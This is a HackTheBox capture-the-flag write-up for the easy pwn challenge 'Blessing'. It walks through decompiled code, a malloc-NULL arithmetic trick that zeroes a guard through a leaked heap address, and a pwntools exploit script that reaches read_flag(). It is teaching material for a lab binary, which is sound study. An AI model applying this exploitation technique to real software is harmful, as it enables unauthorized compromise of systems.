# Blessing — HackTheBox PWN Writeup

> **Difficulty:** Easy  
> **Category:** PWN  
> **Author:** w3th4nds  

---

## Description

> In the realm of Eldoria, where warriors roam, the Dragon's Heart they seek, from bytes to byte's home.  
> Through exploits and tricks, they boldly dare, to conquer Eldoria, with skill and flair.

A bard offers you a gift and asks for a song in return. Hidden inside that exchange is a `malloc` failure that lets you redirect execution to `read_flag()`.

---

## Binary Info

```
blessing: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

### Protections

| Protection | Status | Effect |
|------------|--------|--------|
| Canary     | ✅ Enabled | Prevents stack buffer overflows |
| NX         | ✅ Enabled | No code execution on stack |
| PIE        | ✅ Enabled | Randomizes base address |
| Full RelRO | ✅ Enabled | GOT is read-only |

All protections are on — but none of them matter here.

---

## Enumeration

### Key symbols (binary is not stripped)

```
read_flag    ← target function
main
banner
printstr
setup
```

The presence of `read_flag` as a named symbol tells us this is a **ret2win-style logic challenge**, not a memory corruption exploit.

### Program flow (from decompilation)

```c
int64_t* rax_1 = malloc(0x30000);   // [1] first malloc — address is LEAKED
*(uint64_t*)rax_1 = 1;              // [2] guard set to 1

printf(..., rax_1);                 // [3] leak printed to stdout
sleep(1);                           // [4] cleared after 1 second

scanf("%lu", &length);              // [5] we control the length
int64_t buf = malloc(length);       // [6] second malloc with our length
read(0, buf, length);               // [7] read into buf
*(uint64_t*)((buf + length) - 1) = 0;  // [8] last byte zeroed

if (*(uint64_t*)rax_1 != 0)        // [9] guard check
    // bad path
else
    read_flag();                    // [10] WIN
```

---

## Vulnerability

### The bug: `malloc` returns `NULL` on failure

From `man malloc`:

> `malloc()` returns NULL on error, or when called with a size of zero.  
> Passing a negative value (or a value too large) causes malloc to fail.

The program leaks the address of the first allocation (`rax_1`). If we pass `leaked_addr + 1` as the song length, the value overflows and becomes an impossibly large number — **malloc fails and returns `NULL` (0x0)**.

### The math

```
buf    = NULL = 0x0
length = leaked_addr + 1

zero-write target:
  buf + length - 1
= 0 + (leaked_addr + 1) - 1
= leaked_addr              ← exactly where rax_1 points!
```

So `*(rax_1) = 0` — the guard is cleared, the condition fails, and `read_flag()` is called.

---

## Exploit (Manual)

### Step 1 — Run the binary and grab the leak

```bash
./blessing
```

Look for the line:
```
Please accept this: 0x7f1234560010
```

You have **1 second** before it clears. Write it down.

### Step 2 — Compute the length

```bash
python3 -c "print(0x7f1234560010 + 1)"
# → 139727906267153
```

### Step 3 — Run again and send the payload

```bash
./blessing
```

When prompted:
```
Give me the song's length: 139727906267153
Now tell me the song: AAAA
```

### Step 4 — Flag

```
HTB{...}
```

---

## Exploit (Scripted)

```python
from pwn import *

p = process("./blessing")
# For remote:
# p = remote("94.237.x.x", PORT)

p.recvuntil(b"Please accept this: ")
leak = int(p.recvline().strip(), 16)
log.success(f"Leaked: {hex(leak)}")

length = leak + 1
log.info(f"Sending length: {length}")

p.recvuntil(b"Give me the song's length: ")
p.sendline(str(length).encode())

p.recvuntil(b"tell me the song: ")
p.sendline(b"AAAA")

p.interactive()
```

---

## Root Cause Summary

| Step | What happens |
|------|-------------|
| `malloc(0x30000)` | Allocates buffer, address leaked to stdout |
| `scanf("%lu", &length)` | We supply `leaked_addr + 1` |
| `malloc(length)` | Fails — size too large — returns `NULL` |
| `*(buf + length - 1) = 0` | Writes 0 to exactly `leaked_addr` |
| `if (*(rax_1) != 0)` | Guard is now 0 → condition false |
| `read_flag()` | Called → flag printed |

No ROP. No shellcode. No canary bypass. Pure `malloc` failure + integer arithmetic.

---

## Skills Learned

- `malloc` returns `NULL` (0) when it fails, not just on zero-size input
- A leaked heap address can be used as an arithmetic primitive
- Integer overflow in size arguments is a subtle but powerful primitive
- High binary protections don't help if the logic itself is flawed

---

*Solved manually — no pwntools required.*
